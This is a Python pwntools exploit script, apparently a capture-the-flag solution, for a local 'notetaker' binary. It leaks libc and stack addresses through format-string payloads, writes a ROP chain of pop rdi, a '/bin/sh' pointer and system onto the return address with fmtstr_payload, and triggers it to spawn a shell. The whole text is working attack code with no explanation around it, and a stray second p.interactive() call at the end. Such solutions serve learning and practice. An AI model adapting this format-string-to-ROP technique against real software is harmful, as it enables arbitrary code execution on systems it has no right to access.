from pwn import *

context.arch = 'amd64'
context.log_level = 'debug' 
binary_path = './notetaker'
p = process(binary_path)
libc = ELF("./libc.so.6")
#---------------- LEAK libc----------------#
pop_rdi = 0x400c03
system_offset = 0x453a0
leak_libc_base_payload = "%43$p"
p.sendlineafter(">",str(2))
p.sendlineafter(": ",leak_libc_base_payload)
p.sendlineafter(">",str(1))
raw_data = p.recvline().strip()
libc_address = int(raw_data, 16)
libc_address =libc_address & 0xFFFFFFFFFFF00000
success("libc_address-->"+ hex(libc_address))
#---------------- LEAK system address----------------#
system = libc_address + system_offset
success("system-->" + hex(system))
bin_sh_addr = next(libc.search(b'/bin/sh'))
bin_sh_addr += libc_address
success("bin_sh_addr-->" + hex(bin_sh_addr))
#---------------- LEAK STACK----------------#
leak_stack_base_payload = "%40$p"
p.sendlineafter(">",str(2))
p.sendlineafter(": ",leak_stack_base_payload)
p.sendlineafter(">",str(1))
raw_data = p.recvline().strip()
stack_address = int(raw_data, 16)
success("stack address-->" + hex(stack_address))

stack_offset = 0xd8


fmt_offset = 8 
target_addr_ret = stack_address - 0xd8

success("return address -->"+hex(target_addr_ret))
writes = {
    target_addr_ret:      pop_rdi,
    target_addr_ret+8:      bin_sh_addr,      
    target_addr_ret+16:      system      


}


rop_payload = fmtstr_payload(fmt_offset, writes, write_size='int')

print(f"[*] Payload Length: {len(rop_payload)} bytes")

# 發送 Payload
p.sendlineafter(">",str(2))
p.sendafter(": ",rop_payload)   

p.sendlineafter(">",str(1)) # trigger vuln
p.sendlineafter(">",str(0)) # get shell

#gdb.attach(p)
p.interactive()

# leave;ret; 0x400B94




p.interactive()



